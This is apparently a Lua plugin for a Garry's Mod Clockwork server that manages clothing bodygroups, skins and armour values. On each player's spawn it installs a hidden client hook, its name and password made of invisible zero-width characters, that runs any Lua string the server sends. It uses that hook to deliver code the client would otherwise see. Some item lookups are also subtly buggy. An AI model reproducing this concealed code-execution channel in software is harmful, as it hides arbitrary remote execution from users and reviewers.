--[[
	© 2016 TeslaCloud Studios.
	Private code for Global Cooldown community.
	Stealing Lua cache is not nice lol.
	get a life kiddos.
--]]

local playerMeta = FindMetaTable("Player")

function playerMeta:SetBodygroupClothes(itemTable, bShouldUnwear)
	if (!bShouldUnwear) then
		if (itemTable.OnChangeClothes) then
			local bSuccess, value = pcall(itemTable.OnChangeClothes, itemTable, self, !bShouldUnwear)

			if (!bSuccess) then
				ErrorNoHalt(value.."\n")
				debug.Trace()
			end
		end

		local clothesData = self.bgClothesData or {}
		local bodygroup = itemTable.bodyGroup
		clothesData[bodygroup] = clothesData[bodygroup] or {}

		if (clothesData[bodygroup].itemID) then
			local oldItemTable = Clockwork.inventory:FindItemByID(self:GetInventory(), clothesData.uniqueID, clothesData.realID) or {}

			if (oldItemTable.OnChangeClothes) then
				local bSuccess, value = pcall(oldItemTable.OnChangeClothes, oldItemTable, self, bShouldUnwear)

				if (!bSuccess) then
					ErrorNoHalt(value.."\n")
					debug.Trace()
				end
			end

			clothesData[bodygroup] = {}
		end

		clothesData[bodygroup].val = itemTable.bodyGroupVal
		clothesData[bodygroup].itemID = itemTable.uniqueID.." "..itemTable.itemID
		clothesData[bodygroup].uniqueID = itemTable.uniqueID
		clothesData[bodygroup].realID = itemTable.itemID
		clothesData.plyProtection = (clothesData.plyProtection or 0) + (itemTable.protection or 0)
		Clockwork.datastream:Start(self, "BGClothes", clothesData)

		self.bgClothesData = clothesData
	else
		if (itemTable.OnChangeClothes) then
			local bSuccess, value = pcall(itemTable.OnChangeClothes, itemTable, self, !bShouldUnwear)

			if (!bSuccess) then
				ErrorNoHalt(value.."\n")
				debug.Trace()
			end
		end

		local clothesData = self.bgClothesData or {}
			local bodygroup = itemTable.bodyGroup
			clothesData[bodygroup] = false
			clothesData.plyProtection = (clothesData.plyProtection or 0) - (itemTable.protection or 0)
		Clockwork.datastream:Start(self, "BGClothes", clothesData)

		self.bgClothesData = clothesData
	end
end

function playerMeta:SetSkinClothes(itemTable, bShouldUnwear)
	if (!bShouldUnwear) then
		if (itemTable.OnChangeClothes) then
			local bSuccess, value = pcall(itemTable.OnChangeClothes, itemTable, self, !bShouldUnwear)

			if (!bSuccess) then
				ErrorNoHalt(value.."\n")
				debug.Trace()
			end
		end

		local clothesData = self.skinClothesData or {}
			local skin = itemTable.playerSkin
			clothesData[skin] = clothesData[skin] or {}

			if (clothesData[skin].itemID) then
				local oldItemTable = Clockwork.inventory:FindItemByID(self:GetInventory(), clothesData.uniqueID, clothesData.realID) or {}

				if (oldItemTable.OnChangeClothes) then
					local bSuccess, value = pcall(oldItemTable.OnChangeClothes, oldItemTable, self, bShouldUnwear)

					if (!bSuccess) then
						ErrorNoHalt(value.."\n")
						debug.Trace()
					end
				end

				clothesData[skin] = {}
			end

			clothesData[skin].val = skin
			clothesData[skin].itemID = itemTable.uniqueID.." "..itemTable.itemID
			clothesData[skin].uniqueID = itemTable.uniqueID
			clothesData[skin].realID = itemTable.itemID
			clothesData.plyProtection = (clothesData.plyProtection or 0) + (itemTable.protection or 0)
		Clockwork.datastream:Start(self, "SkinClothes", clothesData)

		self.skinClothesData = clothesData
	else
		if (itemTable.OnChangeClothes) then
			local bSuccess, value = pcall(itemTable.OnChangeClothes, itemTable, self, !bShouldUnwear)

			if (!bSuccess) then
				ErrorNoHalt(value.."\n")
				debug.Trace()
			end
		end

		local clothesData = self.skinClothesData or {}
			local skin = itemTable.playerSkin
			clothesData[skin] = false
			clothesData.plyProtection = (clothesData.plyProtection or 0) - (itemTable.protection or 0)
		Clockwork.datastream:Start(self, "SkinClothes", clothesData)

		self.skinClothesData = clothesData
	end
end

function PLUGIN:PlayerInitialSpawn(player)
	local code = "Clockwork.datastream:Hook('​', function(code, pwd) if (pwd == '​​​​​​​​​​') then RunString(code) end end)"
	player:SendLua(code)

	local toSend = [[
		Clockwork.datastream:Hook("BGClothes", function(clothesData)
			Clockwork.Client.bgClothesData = clothesData or {}

			if (!bNoRebuild) then
				Clockwork.inventory:Rebuild()
			end
		end)

		Clockwork.datastream:Hook("SkinClothes", function(clothesData, bNoRebuild)
			Clockwork.Client.skinClothesData = clothesData or {}

			if (!bNoRebuild) then
				Clockwork.inventory:Rebuild()
			end
		end)
	]]

	Clockwork.datastream:Start(player, "​", toSend, "​​​​​​​​​​")
end

function PLUGIN:PlayerCharacterUnloaded(player)
	Clockwork.datastream:Start(player, "BGClothes", nil, true)
	player.bgClothesData = nil

	for i = 0, player:GetNumBodyGroups() - 1 do
		player:SetBodygroup(i, 0)
	end

	Clockwork.datastream:Start(player, "SkinClothes", nil, true)
	player.skinClothesData = nil

	-- Commented this to fix char customization - Viz.
	-- player:SetSkin(0)
end